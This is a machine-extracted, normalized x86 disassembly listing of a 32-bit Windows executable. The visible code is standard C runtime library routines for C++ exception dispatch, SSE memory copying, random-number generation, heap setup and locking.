pop ebp
retn
push esi
push eax
call sub_40f436
call sub_40f46f
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_40f8fa
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_40fb5d
add esp 0x28
test eax eax
je r-xdata
sub_40ff78
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_407dbd
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_407dbd
lea edi [ eax + 0x80 ]
call sub_407c0d
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_40f6a2
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_40c217
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40f52c
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40ff0a
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_41007f
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_40c217
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_407dbd
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40c217
call sub_40c1cb
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40ff78
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_407dbd
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_407dbd
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_407dbd
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_410582
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_40f6a2
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_40c217
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_40fa1b
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_407dbd
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_407dbd
mov edi [ eax + 0x94 ]
call sub_407dbd
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_40fa99
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_40fa99
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40573f
test al al
jne r-xdata
call sub_40c217
cmp eax 0x19930522
jne r-xdata
call sub_407dbd
call sub_407dbd
call sub_407dbd
mov [ eax + 0x88 ] esi
call sub_407dbd
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_40f84c
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_40fa1b
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_405a8d
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_405cb1
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_40ff0a
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_40f46f
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40f8fa
add esp 0x10
push [ esi + 0x1c ]
call sub_40fb14
sub_410411
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_407dbd
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_41007f
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40f8fa
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_410500
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_40ecec
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_40ecec
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41054c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4105a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_410624 ]
jmp [ ecx * 4 + jump_table_4106a4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410710 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_4108ac ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4107b0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4108ac ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_410710 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4108ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410710 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410710 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410710 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4108ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4108ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4108ac ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_40445e
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404538
sub_404469
mov [ ecx ] r--data
jmp sub_405ae9
sub_40449b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_405b1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404c23
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_409f59
pop ecx
pop ecx
retn
sub_404c52
push 0x1
call sub_409cc7
pop ecx
retn
sub_404ca4
push [ ebp + 0x8 ]
call sub_409f1d
pop ecx
retn
sub_404cae
push 0x1
call sub_404b81
pop ecx
retn
sub_404e15
push [ ebp + 0x8 ]
call sub_409f1d
pop ecx
retn
sub_404e1f
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404d63
add esp 0xc
pop ebp
retn
sub_405076
push [ ebp + 0x18 ]
call sub_409f1d
pop ecx
retn
sub_405080
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_404ff2
add esp 0x14
pop ebp
retn
sub_40509d
mov edi edi
push ebp
mov ebp esp
call sub_407dbd
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_4050af
call sub_407dbd
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_405297
push [ ebp + 0x14 ]
call sub_409f1d
pop ecx
retn
sub_4054cc
push [ ebp + 0x8 ]
call sub_409f1d
pop ecx
retn
sub_4055d2
push [ ebp + 0x8 ]
call sub_409f1d
pop ecx
retn
sub_4056b5
push esi
call sub_409f1d
pop ecx
retn
sub_40570e
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_40b858
pop ecx
retn
sub_4058b7
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_40b9a8
pop ecx
pop ecx
retn
sub_4058cb
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_406064
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_409fd5
retn
push eax
call sub_40603f
_start
call sub_40bf65
jmp sub_405788
sub_405a05
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_405a22
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_405a6f
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_404538
pop ecx
sub_405ae9
mov [ ecx ] r--data
jmp sub_405a6f
sub_405c5d
call sub_405df2
retn
sub_405c63
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_405c27
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_405c7a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_405d88
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_405dd1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_405da6
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_405de9
push 0x8
call sub_409da0
pop ecx
retn
sub_405df2
push 0x8
call sub_409cc7
pop ecx
retn
sub_406014
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_409cc7
pop ecx
sub_406029
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_405ee9
add esp 0xc
pop ebp
retn
sub_40603f
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_405ee9
add esp 0xc
pop ebp
retn
sub_406055
push 0x1
push 0x0
push 0x0
call sub_405ee9
add esp 0xc
retn
sub_406064
push 0x1
push 0x1
push 0x0
call sub_405ee9
add esp 0xc
retn
sub_406073
mov edi edi
push ebp
mov ebp esp
call sub_406266
push [ ebp + 0x8 ]
call sub_4060b7
pop ecx
push 0xff
call sub_40603f
int3
sub_407056
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4074ae
push 0xd
call sub_409cc7
pop ecx
retn
sub_40787d
push 0xd
call sub_409cc7
pop ecx
retn
sub_4078b6
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40771c
pop ecx
mov [ rw-data ] 0x1
sub_407c01
push 0xc
call sub_409cc7
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_407c0d
push 0x0
call [ EncodePointer@IAT ]
retn
sub_407c16
call [ TlsAlloc@IAT ]
retn 0x4
sub_407d32
push 0xd
call sub_409cc7
pop ecx
retn
sub_407d3b
push 0xc
call sub_409cc7
pop ecx
retn
sub_407ef1
push 0xd
call sub_409cc7
pop ecx
retn
sub_407efd
push 0xc
call sub_409cc7
pop ecx
retn
sub_409b1f
push ebx
call sub_40ddda
pop ecx
retn
sub_409c1e
push ebx
call sub_40ddda
pop ecx
retn
sub_409cc7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_409d97
push 0xa
call sub_409cc7
pop ecx
retn
sub_409dd3
mov eax rw-data
retn
sub_409e8a
call sub_404cae
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_404538
pop ecx
retn
call sub_40df9a
sub_409fd5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40a540
push 0x1
call sub_409cc7
pop ecx
retn
sub_40a626
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40a550
add esp 0xc
pop ebp
retn 0x4
sub_40a659
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_40ecf5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_40a68b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40a550
add esp 0xc
pop ebp
retn 0x8
sub_40ae69
push ebx
call sub_40ddda
pop ecx
retn
sub_40b657
push ebx
call sub_40ddda
pop ecx
retn
sub_40b7b7
push ebx
call sub_40ddda
pop ecx
retn
sub_40b8bf
push 0xe
call sub_409cc7
pop ecx
retn
sub_40b99a
push sub_40b958
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40c000
and [ rw-data ] 0x0
retn
sub_40c1cb
push 0x8
push r--data
call sub_409f90
call sub_407dbd
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40f0ec
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40c1eb
xor eax eax
inc eax
retn
sub_40c204
call sub_407dbd
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_40c1cb
call eax
sub_40c23b
xor eax eax
inc eax
retn
sub_40c24f
push sub_40c1cb
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_40c260
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40c2b5
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_40c429
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_409cc7
pop ecx
sub_40c465
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c474
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40c5cb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_40cacc
push [ ebp + 0x8 ]
call sub_40ddda
pop ecx
retn
sub_40cb75
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_40cce0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40cb8b
add esp 0x14
pop ebp
retn
sub_40cd35
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40ccfd
pop ecx
pop ecx
pop ebp
retn
sub_40dafd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d9e7
add esp 0x10
pop ebp
retn
sub_40ddd1
push 0xa
call sub_409cc7
pop ecx
retn
sub_40ded3
push 0xa
call sub_409cc7
pop ecx
retn
sub_40df91
push 0xb
call sub_409cc7
pop ecx
retn
sub_40e02d
push 0x1
call sub_409cc7
pop ecx
retn
sub_40ea52
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
